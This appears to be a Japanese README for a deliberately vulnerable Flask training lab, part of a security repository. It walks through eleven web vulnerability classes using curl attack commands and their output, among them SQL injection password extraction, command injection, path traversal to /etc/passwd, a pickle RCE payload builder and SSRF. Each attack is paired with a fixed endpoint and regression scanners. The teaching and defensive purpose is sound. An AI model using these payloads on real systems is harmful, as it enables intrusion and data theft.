# 脆弱性実証ラボ(エージェント不要・サンドボックス内完結版)

Strix(AIエージェントによる自動ペンテスト)をローカル(Windows/WSL2 + Ollama/Groq/OpenRouter)で
動かす一連の試み([`../strix-local-poc/windows-wsl-ollama-setup.md`](../strix-local-poc/windows-wsl-ollama-setup.md))
と並行して、「発想を変えて、AIエージェントなしで脆弱性自体を実証する」ために作った最小限のラボ。
当初はSQLiのみだったが、「Strixは他の脆弱性クラスも見る」という問いを受けてXSS、
OSコマンドインジェクション・パストラバーサル・CSRF(クロスサイト・リクエスト・フォージェリ)・
アクセス制御の不備(IDOR/BOLA)・安全でないデシリアライズによるRCE(リモートコード実行)、
さらに実際にStrixを使った第三者の記事(Zenn)との照合をきっかけに、格納型XSS・
マスアサインメント・SSRF・アカウント列挙の4クラスを追加し、計11クラスに拡張した。

Claude Codeのクラウドサンドボックス環境は外向きのLLM通信がほぼ全てブロックされているため
(詳細は[`../strix-local-backend-notes.md`](../strix-local-backend-notes.md))、Strixのようなエージェント実行は
ここでは成立しなかった。一方で、**このサンドボックス自体を対象にしたSQLi実証**であれば、
外部通信は一切不要(pip install flaskのみでpypi.orgに1回アクセスするだけ)なので、問題なく完結した。

> ⚠️ 本コードは意図的に脆弱です。自分が所有・管理する隔離環境以外では絶対に動かさないこと。

## CIの集計(`scripts/summarize.py`)への組み込み

[`run_regression.py`](run_regression.py)で実装済み(2026-10-22)。以下の設計方針で、
上記の論点(着手前の検討)に沿って作った:

- このラボの対象(`vulnerable_app.py`)は**意図的に脆弱なデモアプリ**であり、このリポジトリ
  自身のコードではない。そのため、CIの既存ステップ(Semgrep/Trivy/gitleaks)のような
  「このリポジトリの脆弱性を検出するゲート」としては組み込んでいない。組み込んだのは
  「このラボ自身の検出スクリプト(`auto_vuln_scanner.py`/`session_vuln_check.py`)が
  壊れていないか」を確認する**回帰テスト**。`vulnerable_app.py`を起動し、全22パターン
  (11クラス×脆弱/修正)を実行して、**脆弱版は必ずVULNERABLE、修正版は必ずsafeと
  判定されること**をアサートする。クラス自体や判定ロジックが壊れた場合にのみ、
  不一致として報告される(正常時は何も出力しない。他のパーサー(Semgrep等)と同じ、
  「問題があるものだけを報告する」という設計)。
- `scripts/summarize.py`の`SOURCES`に`sqli_lab.json`パーサーを追加し、
  Semgrep/Trivy/gitleaks/ZAPと同じ集計・Markdown/Elastic/Datadog出力に乗せた。

```bash
# 単体実行(vulnerable_app.pyを自動起動し、22パターンすべてを検証)
python3 run_regression.py --out sqli_lab.json

# summarize.py経由でのCI集計と同じ形式で見る
python3 ../../scripts/summarize.py results --fail-on high
```

CIでは`.github/workflows/security-scan.yml`の「sqli-lab のリグレッションテスト」
ステップで、`pip install flask requests markupsafe`のみ(pypi.orgへの1回のアクセス)で
完結する。意図的にリグレッションを起こして(例: `detect_sqli`を壊す)動作確認済み——
正しく`regression: sqli scanner misclassified /login`のような指摘を`high`で返す。

## スコープ制限(誤って外部に撃たないためのガード)

`auto_vuln_scanner.py`は実際に攻撃ペイロードを送信するツールなので、`netcheck/netcheck.py`
と同じ考え方で、**既定ではローカル(`127.0.0.0/8`)とプライベート範囲(`10.0.0.0/8`・
`172.16.0.0/12`・`192.168.0.0/16`・`::1`)以外には対して実行できない**ようにしてある。
`--url`のホスト名を解決し、解決先IPがこれらの範囲外なら即座に拒否する(exit code 2)。

```bash
# 拒否される例
python3 auto_vuln_scanner.py --url http://8.8.8.8/login --class sqli --baseline x=x --fuzz x
# => Refusing to scan: '8.8.8.8' resolves to 8.8.8.8, which is outside
#    localhost/RFC1918 private ranges. ... pass --i-own-this-target to override.
```

自分が所有する、プライベート範囲外のホスト(社内ネットワークの外のステージング環境等)を
明示的にテストしたい場合のみ、`--i-own-this-target`で上書きできる。

## 対象の事前評価(ペイロードを撃つ前に)

`auto_vuln_scanner.py`/`session_vuln_check.py`は、実際の攻撃ペイロードを撃つ前に
対象へベースラインのGETを1回送り、**「対象が生きているか」「何を相手にしているか」**を
先に確認するようになっている(`assess_target()`)。これが無いと、「検出ゼロ」という結果が
「本当に脆弱ではない」のか「対象が落ちていて何も試せていない」のか区別できない。

```bash
python3 auto_vuln_scanner.py --url http://127.0.0.1:5000/login --class sqli \
  --baseline username=zzz --baseline password=zzz --fuzz username
```

```
Target assessment:
  status=401 size=109B time=5ms content-type='text/html; charset=utf-8'
  Server='Werkzeug/3.1.9 Python/3.13.16' X-Powered-By='(none)'
```

- `status`/`size`/`time`/`Content-Type`: ベースライン応答の基本情報。
- `Server`/`X-Powered-By`: 対象が何で動いているかの手がかり。
- ベースラインが`4xx`/`5xx`を返した場合は警告を出す(以降の検出結果は`--baseline`や
  `--url`のパスを疑ってから見ること、という合図)。
- 対象に**接続すらできない場合**は、ペイロードを1つも撃たずにここで中断する
  (`exit code 2`)。接続エラーのスタックトレースではなく、理由を1行で示す。

`session_vuln_check.py`側も同じ考え方で、各クラスのチェック(ログイン→本処理)に入る前に
`args.url`への到達性だけを確認する(ログイン失敗やセッション状態は各チェック自身の仕事なので、
ここでは「接続できるかどうか」のみを見る)。

### PHP2Shellバージョン照合(`check_php2shell()`)

`X-Powered-By`ヘッダーが`PHP/x.y.z`の形式なら、PHP2Shell(CVE-2026-109618/109619、
CVSS 9.2、[php2shell.com](https://www.php2shell.com/)で2026-10-21に公開された、
PHPランタイム自体のメモリ安全性の脆弱性)の修正済みバージョンと自動的に照合し、
該当すれば警告を出す。**エクスプロイトコードは一切含まない、バージョン範囲の比較のみ**
(`os_patch_check_linux.py`/`os_patch_check_windows.py`と同じ思想)。

```
Target assessment:
  status=200 size=39B time=2ms content-type='(none)'
  Server='nginx' X-Powered-By='PHP/8.3.1'
  warning: PHP 8.3.1 is below the first fixed release 8.3.36 for this branch -- vulnerable to PHP2Shell (CVE-2026-109618/109619, CVSS 9.2): a PHP *runtime* bug, not an application bug -- affects any app on a vulnerable PHP version. https://www.php2shell.com/
```

対象のアプリケーションコード(SQLi等)とは無関係に、**PHPランタイム自体**が古ければ
警告が出る点に注意(`vulnerable_app.py`はFlask/Pythonなので`X-Powered-By`は出ず、
この照合は常にスキップされる。モックのPHP風サーバーでのみ実動作を確認済み)。

| 対象ブランチ | 修正済みバージョン |
|---|---|
| 8.2 | 8.2.35 |
| 8.3 | 8.3.36 |
| 8.4 | 8.4.27 |
| 8.5 | 8.5.12 |
| 8.1以前 | php2shell.comの記載では「公式の修正版なし」とされる旨の警告のみ(php.net自身の
  アドバイザリでの裏取りは未実施) |

この範囲外(8.6以降など)は、このリポジトリがデータを持っていないため何も表示しない
(脆弱でない、という意味ではない)。

### Apache / Nginx のバージョン照合(`check_apache_http2()` / `check_nginx_rewrite()`)

同じ考え方で、`Server`ヘッダーから検出したApache httpd / Nginxのバージョンを、実在する
重大CVEの修正済みバージョンと照合する(detections/のR16・R17に対応)。

- **Apache**: `Server: Apache/x.y.z` が **2.4.x系かつ 2.4.67未満**なら、CVE-2026-23918
  (mod_http2のダブルフリー、CVSS 8.8、httpd 2.4.67で修正)の警告を出す。**2.4.x系以外
  (2.2系等)は対象外**——このCVEの舞台であるmod_http2自体が2.4.17より前には存在しない
  ため、古いバージョンだからといって無条件に「このCVEに」脆弱とは判定しない(他の問題は
  別途あり得るが、このチェックの対象外)。
- **Nginx**: `Server: nginx/x.y.z` が **1.30.1未満**なら、CVE-2026-42945(通称
  「NGINX Rift」、ngx_http_rewrite_moduleのヒープオーバーフロー、18年来のバグ、
  CVSS 9.2、公開後に実悪用が報告された)の警告を出す。ただし実際の悪用には
  `nginx.conf`側の特定のrewriteディレクティブパターンが必要なため、**バージョンが
  古いだけでは悪用可能とは限らない**旨を警告メッセージ自体に明記している。

```
Target assessment:
  status=200 size=5B time=3ms content-type='(none)'
  Server='Apache/2.4.66' X-Powered-By='(none)'
  warning: Apache 2.4.66 is below the first fixed release 2.4.67 -- vulnerable to CVE-2026-23918 (Apache httpd mod_http2 double-free, CVSS 8.8): https://thehackernews.com/2026/05/critical-apache-http2-flaw-cve-2026.html
```

`vulnerable_app.py`はFlask/Pythonなので`Server`は`Werkzeug/...`になり、この照合は常に
スキップされる。モックのApache/nginx風サーバー(`Server`ヘッダーのみ偽装)でのみ
実動作を確認済み。

## 対象アプリ

[`vulnerable_app.py`](vulnerable_app.py): Flask + SQLite の最小アプリ。11種類の脆弱性クラスを含む。

- `/login`: 文字列連結でSQLを組み立てる、**意図的に脆弱**なエンドポイント(SQLi)
- `/login_safe`: パラメータ化クエリ(プレースホルダ `?`)を使う、**修正済み**の同じ機能のエンドポイント
- `/search`: 入力をHTMLエスケープせずそのまま反映する、**意図的に脆弱**なエンドポイント(反射型XSS)
- `/search_safe`: `markupsafe.escape()`でエスケープする、**修正済み**の同じ機能のエンドポイント
- `/diag`: `subprocess.run(..., shell=True)` + 文字列連結で外部コマンドを組み立てる、**意図的に脆弱**な
  エンドポイント(OSコマンドインジェクション)
- `/diag_safe`: `shell=False`でホスト名を1つの引数として渡す、**修正済み**の同じ機能のエンドポイント
- `/file`: `docs/`配下のファイルを素朴にパス連結で読む、**意図的に脆弱**なエンドポイント(パストラバーサル)
- `/file_safe`: 解決後のパスが`docs/`配下に収まっているかを検証する、**修正済み**の同じ機能のエンドポイント
- `/csrf_login` + `/csrf_transfer`: セッションCookieだけで送金処理を実行する、**意図的に脆弱**な
  エンドポイント(CSRF)。CSRFトークンの検証が一切無い。
- `/csrf_transfer_safe`: ログイン時に発行したCSRFトークンの一致を検証する、**修正済み**の同じ機能のエンドポイント
- `/idor_login` + `/idor_account`: ログイン中のユーザーIDと無関係に、指定した`user_id`の
  アカウント情報をそのまま返す、**意図的に脆弱**なエンドポイント(アクセス制御の不備/IDOR・BOLA)
- `/idor_account_safe`: 要求された`user_id`がログイン中のセッション本人のものかを検証する、
  **修正済み**の同じ機能のエンドポイント
- `/deserialize`: 受け取ったデータをそのまま`pickle.loads()`する、**意図的に脆弱**な
  エンドポイント(安全でないデシリアライズ → RCE)。細工したpickleバイト列を送るだけで
  サーバー上で任意のコードが実行される。
- `/deserialize_safe`: `pickle`の代わりに`json.loads()`を使う、**修正済み**の同じ機能のエンドポイント
  (JSONはコード実行の仕組みを一切持たない単純なデータ形式)
- `/review` + `/reviews`: 投稿した内容をエスケープせずに一覧表示する、**意図的に脆弱**な
  エンドポイント(格納型XSS)。反射型と違い、被害者自身がリクエストに攻撃文字列を含める必要が無い。
- `/review_safe` + `/reviews_safe`: 表示時に`markupsafe.escape()`でエスケープする、
  **修正済み**の同じ機能のエンドポイント
- `/signup`: 送信された全フィールド(`is_admin`含む)をそのまま新規アカウントに反映する、
  **意図的に脆弱**なエンドポイント(マスアサインメント)
- `/signup_safe`: 許可したフィールド(username/password)だけを明示的に反映する、
  **修正済み**の同じ機能のエンドポイント(`is_admin`は何を送っても常に`false`)
- `/fetch_url`: 指定されたURLを制限無くサーバー側から取得して返す、**意図的に脆弱**な
  エンドポイント(SSRF)。`127.0.0.1:5001`で動く「内部限定サービス」(クラウドのメタデータ
  サービス相当)の秘密情報を、このエンドポイント経由で外部から取得できてしまう。
- `/fetch_url_safe`: 取得先がloopback/プライベート/リンクローカルアドレスに解決される場合は
  拒否する、**修正済み**の同じ機能のエンドポイント
- `/register`: 既に登録済みのメールアドレスにだけ異なるエラー(409)を返す、**意図的に脆弱**な
  エンドポイント(アカウント列挙)。レスポンスの違いから、登録済みメールアドレスを総当たりで
  特定できてしまう。
- `/register_safe`: 登録済みかどうかに関わらず同じレスポンスを返す、**修正済み**の同じ機能の
  エンドポイント

起動:

```bash
pip3 install --user flask requests
python3 vulnerable_app.py   # http://127.0.0.1:5000
```

## 実証した攻撃(すべて `curl` で再現可能)

### 1. 認証バイパス(コメントアウトでパスワード条件を無効化)

```bash
curl -s -G "http://127.0.0.1:5000/login" \
  --data-urlencode "username=admin' --" \
  --data-urlencode "password=anything"
```

生成されるSQL:

```sql
SELECT id, username, is_admin FROM users WHERE username = 'admin' --' AND password = 'anything'
```

結果: パスワードを一切知らずに `admin`(is_admin=1)でログイン成立。

### 2. OR 1=1(常に真の条件で全行マッチ)

```bash
curl -s -G "http://127.0.0.1:5000/login" \
  --data-urlencode "username=admin' OR '1'='1' --" \
  --data-urlencode "password=anything"
```

結果: 全ユーザー行が返り、ログイン成立。

### 3. UNIONベースのデータ抽出(パスワードを直接窃取)

```bash
curl -s -G "http://127.0.0.1:5000/login" \
  --data-urlencode "username=nobody' UNION SELECT id, username, password FROM users --" \
  --data-urlencode "password=x"
```

結果:

```
Rows: [(1, 'alice', 'alice_pw_123'), (2, 'bob', 'bob_pw_456'), (3, 'admin', 'S3cretAdminPW!')]
```

ログインすら試みずに、全ユーザーの平文パスワード(admin含む)を直接取得できた。

### 対策の効果(同じ攻撃を `/login_safe` に送る)

```bash
curl -s -G "http://127.0.0.1:5000/login_safe" \
  --data-urlencode "username=admin' --" \
  --data-urlencode "password=anything"
# => "Login failed." (攻撃文字列はただの文字列として扱われ、無効化される)
```

パラメータ化クエリ(プレースホルダ + バインド)に変えるだけで、同じ入力が
SQL構文として解釈されなくなり、上記3つの攻撃すべてが無効になる。

> **関連する実世界のインシデント**: wp2shell — WordPress REST APIバッチエンドポイントの
> ルート混同(CVE-2026-63030)が認可チェックをバイパスし、その先で未認証のSQLi
> (CVE-2026-60137)が実行可能になっていた脆弱性チェーン。実際にWebシェル設置まで
> 悪用されたと2026年10月にWizが報告している。本リポジトリではR13として検知ルール化
> 済み(`../detections/sigma/r13_wp2shell_wordpress_batch_exploitation.yml`、
> `../detections/README.md`参照)。`auto_vuln_scanner.py --class sqli`を実行すると、
> 見つかった場合にこの実例への参照を併せて出力する。

### 4. OSコマンドインジェクション(`/diag`)

```bash
curl -s -G "http://127.0.0.1:5000/diag" --data-urlencode "host=example.com; id"
# => Checking: example.com
#    uid=0(root) gid=0(root) groups=0(root)
```

`;`でコマンドを連結でき、本来意図していない`id`コマンドの出力がそのまま漏洩する。
`shell=True` + 文字列連結が原因。対策版(`/diag_safe`、`shell=False`でホスト名を
1つの引数として渡す)に同じ攻撃を送ると、`;`等は単なる文字列として扱われ無効化される。

```bash
curl -s -G "http://127.0.0.1:5000/diag_safe" --data-urlencode "host=example.com; id"
# => Checking: example.com; id   (コマンドとして解釈されず、ただの文字列)
```

### 5. パストラバーサル(`/file`)

```bash
curl -s -G "http://127.0.0.1:5000/file" --data-urlencode "name=../../../../../../../../../../etc/passwd"
# => root:x:0:0:root:/root:/bin/bash ...
```

意図していた`docs/`ディレクトリの外、`/etc/passwd`の内容がそのまま読み出せる。
対策版(`/file_safe`、解決後のパスが`docs/`配下に収まっているかを検証)に同じ攻撃を送ると、
`403 Access denied.`で拒否される。

### 6. CSRF(`/csrf_transfer`)

CSRFは他の脆弱性と違い、ペイロードを工夫する攻撃ではなく、**「正規ユーザーのセッションCookieに
ただ乗りする」攻撃**。攻撃者は自分のサイトに自動送信フォームを仕込むだけで、ユーザー本人の
ブラウザが(ログイン中の)セッションCookieを一緒に送ってしまう。

```bash
# 1. 正規ユーザーとしてログイン(Cookieを保存)
curl -s "http://127.0.0.1:5000/csrf_login" -c cookies.txt
# => Logged in as alice. Balance: 100.

# 2. 攻撃者の偽フォームを模擬: 同じCookieで、CSRFトークン無しに送金を実行
curl -s -b cookies.txt -X POST "http://127.0.0.1:5000/csrf_transfer" -d "amount=50"
# => Transferred 50. New balance: 50.   ← トークンを知らなくても送金が成立してしまう
```

対策版(`/csrf_transfer_safe`、ログイン時に発行したCSRFトークンとの一致を検証)に同じ
攻撃(トークン無し)を送ると、`403 CSRF token missing or invalid.`で拒否される。
トークンは同一オリジンのページしか読み取れない(ブラウザのSame-Origin Policyで保護される)ため、
第三者のサイトからは正しいトークンを知りようがない。

```bash
curl -s "http://127.0.0.1:5000/csrf_login" -c cookies2.txt
curl -s -b cookies2.txt -X POST "http://127.0.0.1:5000/csrf_transfer_safe" -d "amount=50"
# => CSRF token missing or invalid.
```

### 7. アクセス制御の不備(IDOR/BOLA、`/idor_account`)

IDOR(Insecure Direct Object Reference)/BOLA(Broken Object Level Authorization)は、
「ログインはしているが、**他人のデータへのアクセス権限は無い**」という当たり前の境界が
チェックされていないケース。悪意あるペイロードは不要で、**正当な自分のセッションのまま、
URLパラメータの数字(オブジェクトの参照先)を変えるだけ**で成立する。

```bash
# 一般ユーザー alice としてログイン
curl -s "http://127.0.0.1:5000/idor_login?username=alice" -c cookies3.txt
# => Logged in as alice (user_id=1).

# 自分(id=1)ではなく、admin(id=3)のアカウント情報を覗く
curl -s -b cookies3.txt "http://127.0.0.1:5000/idor_account?user_id=3"
# => Account 3: {'username': 'admin', 'email': 'admin@example.com',
#     'private_note': 'Admin recovery codes: 1234-5678'}
```

一般ユーザーのセッションのまま、管理者アカウントの機密情報(リカバリーコードを含む)が
そのまま取得できてしまう。対策版(`/idor_account_safe`、要求された`user_id`がセッション
本人のものかを検証)に同じリクエストを送ると、`403 Forbidden`で拒否される。

```bash
curl -s -b cookies3.txt "http://127.0.0.1:5000/idor_account_safe?user_id=3"
# => Forbidden: you may only access your own account.
```

### 8. 安全でないデシリアライズによるRCE(`/deserialize`)

これまでの脆弱性は「文字列として解釈されるはずの場所に、構文として解釈される文字が
入り込む」という形だったが、これは違う。Pythonの`pickle`は、データだけでなく
**「このオブジェクトをどう再構築するか(どの関数を何の引数で呼ぶか)」という手順そのもの**
をバイト列に含められる。攻撃者はこの手順として任意の関数呼び出しを仕込める。

```bash
# 悪意あるpickleペイロードを作る(id コマンドを実行する __reduce__ を仕込んだオブジェクト)
python3 -c "
import pickle, base64
class P:
    def __reduce__(self):
        return (eval, (\"__import__('subprocess').check_output(['id']).decode()\",))
print(base64.b64encode(pickle.dumps(P())).decode(), end='')
" > pickle_poc.b64

curl -s -X POST --data-binary @pickle_poc.b64 "http://127.0.0.1:5000/deserialize"
# => Deserialized object: 'uid=0(root) gid=0(root) groups=0(root)\n'
```

`pickle.loads()`を呼んだ瞬間に`id`コマンドが実際に実行され、その出力がHTTPレスポンスに
そのまま返ってくる。「脆弱性がありそう」ではなく、**サーバー上でコードが実行された直接
の証拠**が得られている。対策版(`/deserialize_safe`、`json.loads()`を使用)に同じ
バイト列を送ると、JSONとして構文エラーになるだけで、コードは一切実行されない。

```bash
curl -s -X POST --data-binary @pickle_poc.b64 "http://127.0.0.1:5000/deserialize_safe"
# => Error: Expecting value: line 1 column 1 (char 0)
```

JSONはデータの表現方法であり、どんな値を解釈しても「関数を呼ぶ」という動作には
一切つながらない(pickleとの本質的な違い)。信頼できない入力をデシリアライズする際は、
`pickle`/`yaml.load`(デフォルト設定)/Javaの素の`ObjectInputStream`等、
「手順まで復元する」形式を避け、JSON等の**データのみ**を表す形式を使うのが鉄則。

> **関連する実世界のインシデント**: このデモの「到達点」(RCE→サーバー側に恒久的な
> 足場が残る)は、JPCERT/CCの注意喚起(2026-10-08/09)が報告した、公開Webサーバーから
> 届くWARファイル中のJSPによる簡易Webシェル設置と同じ構図(手段はpickleとJSPで異なるが、
> 「リモートコード実行→永続的な足場」という結果は同じ)。本リポジトリではR8として
> 検知ルール化済み(`../detections/sigma/r8_webshell_placement_and_spawn.yml`)。
> ただし本デモは**特定のCVEの再現ではなく**、同じ脆弱性クラス(安全でないデシリアライズ)
> の合成教材。`session_vuln_check.py --class deserialize`を実行すると、脆弱と判定された
> 場合にこの実例への参照を併せて出力する。

### 9. 格納型XSS(`/review` → `/reviews`)

反射型XSS(③)は「自分のリクエストに攻撃文字列を含める」必要があったが、格納型は違う。
**一度誰か(攻撃者)が投稿すれば、以後その内容を見る全員が被害者になる。**

```bash
# 攻撃者がレビューとして悪意あるスクリプトを投稿
curl -s -X POST "http://127.0.0.1:5000/review" -d "text=<script>alert('stored-xss')</script>"

# 別の誰か(被害者)が後から一覧を見ると、スクリプトがそのまま埋め込まれている
curl -s "http://127.0.0.1:5000/reviews"
# => <ul><li><script>alert('stored-xss')</script></li></ul>
```

対策版(`/review_safe` → `/reviews_safe`、表示時にエスケープ)に同じ投稿をしても、
一覧には無害な文字列として表示されるだけで、スクリプトとしては実行されない。

### 10. マスアサインメント(`/signup`)

新規登録フォームが「送られてきたフィールドをそのままオブジェクトに反映する」設計だと、
フォーム画面に存在しないフィールド名であっても、攻撃者がリクエストに直接追加するだけで
通ってしまうことがある。

```bash
curl -s "http://127.0.0.1:5000/signup?username=mallory&is_admin=true"
# => Account created: {'username': 'mallory', 'is_admin': 'true'}
```

画面上は`is_admin`を選べるUIなど無いのに、パラメータを直接追加するだけで管理者権限付きの
アカウントが作成できてしまっている。対策版(`/signup_safe`、許可したフィールドだけ明示的に
反映)では、同じパラメータを送っても`is_admin`は常に`false`のまま。

```bash
curl -s "http://127.0.0.1:5000/signup_safe?username=mallory&is_admin=true"
# => Account created: {'username': 'mallory', 'password': '', 'is_admin': 'false'}
```

### 11. SSRF(`/fetch_url`)

サーバー自身に外部のURLを取得させる機能(プレビュー表示・Webhook検証等)が、取得先を
制限していないと、**外部から直接は届かないはずの内部限定サービス**(クラウドのメタデータ
サービスが典型例)に、サーバーを踏み台にして届いてしまう。

```bash
curl -s "http://127.0.0.1:5000/fetch_url?url=http://127.0.0.1:5001/latest/meta-data/secret-key"
# => Fetched: INTERNAL-SECRET-KEY-DO-NOT-EXPOSE
```

`127.0.0.1:5001`は本来、アプリ自身だけがアクセスすべき内部サービス(ここでは模擬的な
メタデータAPI)だが、`/fetch_url`がリクエストを代理してしまうため、外部の攻撃者がその
秘密情報を取得できてしまう。対策版(`/fetch_url_safe`、取得先がloopback/プライベート/
リンクローカルに解決される場合は拒否)に同じリクエストを送ると、`403`で拒否される。

> **関連する実世界のインシデント**: Double Agents — GCP Vertex AIのデフォルトの
> サービスアカウント権限が過大で、SSRF経由でクラウドメタデータサービスに到達できると、
> その権限を使ってLLMjacking(盗んだクラウド認証情報での不正利用)に悪用できるという
> Unit 42の調査。本リポジトリではR10として検知ルール化済み
> (`../detections/sigma/r10_metadata_service_credential_access.yml`、
> `llm-target-attacks.ja.md` §5.1参照)。`auto_vuln_scanner.py --class ssrf`を実行すると、
> 見つかった場合にこの実例への参照を併せて出力する。

```bash
curl -s "http://127.0.0.1:5000/fetch_url_safe?url=http://127.0.0.1:5001/latest/meta-data/secret-key"
# => Refused: internal/private address not allowed.
```

### 12. アカウント列挙(`/register`)

新規登録時に「このメールアドレスは既に使われています」という**正直すぎるエラー**を返すと、
攻撃者はそのレスポンスの違いだけを頼りに、総当たりで登録済みメールアドレス(=実在する
アカウント)を特定できてしまう。

```bash
# 未登録のメールアドレス
curl -s "http://127.0.0.1:5000/register?email=brand-new-unused@example.com"
# => Registration received.

# 既に登録済みのメールアドレス(alice@example.com)
curl -s "http://127.0.0.1:5000/register?email=alice@example.com"
# => Error: this email is already registered.   ← レスポンスの違いで存在が分かってしまう
```

対策版(`/register_safe`、どちらの場合も同じレスポンス)では、既存・未登録のどちらを
送っても全く同じ応答が返り、外部から判別できない。

```bash
curl -s "http://127.0.0.1:5000/register_safe?email=alice@example.com"
curl -s "http://127.0.0.1:5000/register_safe?email=brand-new-unused@example.com"
# => どちらも同じ: "If this email is valid, a confirmation has been sent."
```

## まとめ・学び

- SQLiの本質(文字列連結でSQLを組み立てる = 入力がコードとして解釈される)は、
  Strixのような自動ツールを使わなくても、数行のコードと`curl`だけで即座に再現・実証できる。
- 自動ペンテストエージェント(Strix)は「人手で1件ずつ試す」作業を自動化するものであり、
  SQLiという脆弱性クラス自体の理解や実証には必須ではない。
- 修正は複雑な話ではなく、**文字列連結をやめてパラメータ化クエリにする**、の一点に尽きる。
  (ORMを使っている場合も、素のSQL文字列を組み立てる箇所が残っていないか要確認。)

## LLM抜きの自動検出スクリプト

このラボのスクリプトは、検出の「型」ごとに2本にまとめてある(かつては脆弱性クラスごとに
別ファイルだったが、同じ型のものは統合した)。

[`auto_vuln_scanner.py`](auto_vuln_scanner.py): Strixのように「次に何を試すかをLLMが判断する」のではなく、
固定のペイロードリストを総当たりし、レスポンスを機械的に比較するだけの、LLM不要・ルールベースのスキャナー。
**「GETパラメータにペイロードを注入してレスポンスを比較する」という型**に合う7クラス
(`sqli`・`xss`・`cmdi`・`traversal`・`mass_assignment`・`ssrf`・`account_enum`)を
`--class`で切り替え可能。

[`session_vuln_check.py`](session_vuln_check.py): 上記の型に合わない4クラス
(`csrf`・`idor`・`deserialize`・`stored_xss`)をまとめた、もう1本のスクリプト。これらは
「ペイロードを工夫する」のではなく、**セッション状態を跨いだ判定**(CSRF: ログイン→Cookieのみで
トークン無しの状態変更が通るか、IDOR: 正当な自分のセッションのまま他人のオブジェクトIDを
指定して通るか)、**攻撃用バイト列の組み立て**(deserialize: 攻撃コード入りpickleペイロードを
作って送信し、実行結果がレスポンスに現れるか)、または**2段階のリクエスト**(stored_xss:
1回目でペイロードを投稿し、2回目の別リクエストで未エスケープのまま現れるか)が必要なため、
`auto_vuln_scanner.py`とは別の仕組みになっている(同じスコープガードは共有)。

```bash
pip3 install --user requests

# SQLi: 脆弱版 /login をスキャン
python3 auto_vuln_scanner.py --url http://127.0.0.1:5000/login --class sqli \
  --baseline username=zzz --baseline password=zzz --fuzz username

# SQLi: 修正版 /login_safe をスキャン(検出ゼロになるはず)
python3 auto_vuln_scanner.py --url http://127.0.0.1:5000/login_safe --class sqli \
  --baseline username=zzz --baseline password=zzz --fuzz username

# XSS: 脆弱版 /search をスキャン
python3 auto_vuln_scanner.py --url http://127.0.0.1:5000/search --class xss \
  --baseline q=zzz --fuzz q

# XSS: 修正版 /search_safe をスキャン(検出ゼロになるはず)
python3 auto_vuln_scanner.py --url http://127.0.0.1:5000/search_safe --class xss \
  --baseline q=zzz --fuzz q

# コマンドインジェクション: 脆弱版 /diag をスキャン
python3 auto_vuln_scanner.py --url http://127.0.0.1:5000/diag --class cmdi \
  --baseline host=zzz --fuzz host

# コマンドインジェクション: 修正版 /diag_safe をスキャン(検出ゼロになるはず)
python3 auto_vuln_scanner.py --url http://127.0.0.1:5000/diag_safe --class cmdi \
  --baseline host=zzz --fuzz host

# パストラバーサル: 脆弱版 /file をスキャン
python3 auto_vuln_scanner.py --url http://127.0.0.1:5000/file --class traversal \
  --baseline name=public.txt --fuzz name

# パストラバーサル: 修正版 /file_safe をスキャン(検出ゼロになるはず)
python3 auto_vuln_scanner.py --url http://127.0.0.1:5000/file_safe --class traversal \
  --baseline name=public.txt --fuzz name

# CSRF: 脆弱版 /csrf_transfer をチェック
python3 session_vuln_check.py --class csrf --url http://127.0.0.1:5000 \
  --transfer-path /csrf_transfer

# CSRF: 修正版 /csrf_transfer_safe をチェック(拒否されるはず)
python3 session_vuln_check.py --class csrf --url http://127.0.0.1:5000 \
  --transfer-path /csrf_transfer_safe

# IDOR/BOLA: 脆弱版 /idor_account をチェック(alice で admin のデータを覗く)
python3 session_vuln_check.py --class idor --url http://127.0.0.1:5000 \
  --account-path /idor_account

# IDOR/BOLA: 修正版 /idor_account_safe をチェック(拒否されるはず)
python3 session_vuln_check.py --class idor --url http://127.0.0.1:5000 \
  --account-path /idor_account_safe

# デシリアライズRCE: 脆弱版 /deserialize をチェック
python3 session_vuln_check.py --class deserialize --url http://127.0.0.1:5000 \
  --deserialize-path /deserialize

# デシリアライズRCE: 修正版 /deserialize_safe をチェック(拒否されるはず)
python3 session_vuln_check.py --class deserialize --url http://127.0.0.1:5000 \
  --deserialize-path /deserialize_safe

# マスアサインメント: 脆弱版 /signup をスキャン(is_adminを注入)
python3 auto_vuln_scanner.py --url http://127.0.0.1:5000/signup --class mass_assignment \
  --baseline username=zzz --fuzz is_admin

# マスアサインメント: 修正版 /signup_safe をスキャン(検出ゼロになるはず)
python3 auto_vuln_scanner.py --url http://127.0.0.1:5000/signup_safe --class mass_assignment \
  --baseline username=zzz --fuzz is_admin

# SSRF: 脆弱版 /fetch_url をスキャン(内部限定サービスの秘密を狙う)
python3 auto_vuln_scanner.py --url http://127.0.0.1:5000/fetch_url --class ssrf \
  --baseline url=https://example.invalid/ --fuzz url

# SSRF: 修正版 /fetch_url_safe をスキャン(検出ゼロになるはず)
python3 auto_vuln_scanner.py --url http://127.0.0.1:5000/fetch_url_safe --class ssrf \
  --baseline url=https://example.invalid/ --fuzz url

# アカウント列挙: 脆弱版 /register をスキャン(既知の登録済みメールを試す)
python3 auto_vuln_scanner.py --url http://127.0.0.1:5000/register --class account_enum \
  --baseline email=brand-new-unused@example.com --fuzz email

# アカウント列挙: 修正版 /register_safe をスキャン(検出ゼロになるはず)
python3 auto_vuln_scanner.py --url http://127.0.0.1:5000/register_safe --class account_enum \
  --baseline email=brand-new-unused2@example.com --fuzz email

# 格納型XSS: 脆弱版 /review → /reviews をチェック
python3 session_vuln_check.py --class stored_xss --url http://127.0.0.1:5000 \
  --post-path /review --list-path /reviews

# 格納型XSS: 修正版 /review_safe → /reviews_safe をチェック(拒否されるはず)
python3 session_vuln_check.py --class stored_xss --url http://127.0.0.1:5000 \
  --post-path /review_safe --list-path /reviews_safe
```

## まとめて1回で実行する

[`scan_all.sh`](scan_all.sh): 上記22パターン(11クラス × それぞれ脆弱/修正)を1コマンドで
実行するラッパースクリプト。`vulnerable_app.py`が起動済みであることが前提。

```bash
python3 vulnerable_app.py &
./scan_all.sh
```

実行結果:

| 脆弱性クラス | 対象 | ペイロード数 | 検出数 |
|---|---|---|---|
| SQLi | `/login`(脆弱) | 8 | 5(認証バイパス3 + SQLエラー漏洩2) |
| SQLi | `/login_safe`(修正済み) | 8 | 0(誤検知なし) |
| XSS | `/search`(脆弱) | 4 | 4(全ペイロードが未エスケープで反映) |
| XSS | `/search_safe`(修正済み) | 4 | 0(誤検知なし) |
| コマンドインジェクション | `/diag`(脆弱) | 5 | 5(`id`出力の漏洩を全パターンで検出) |
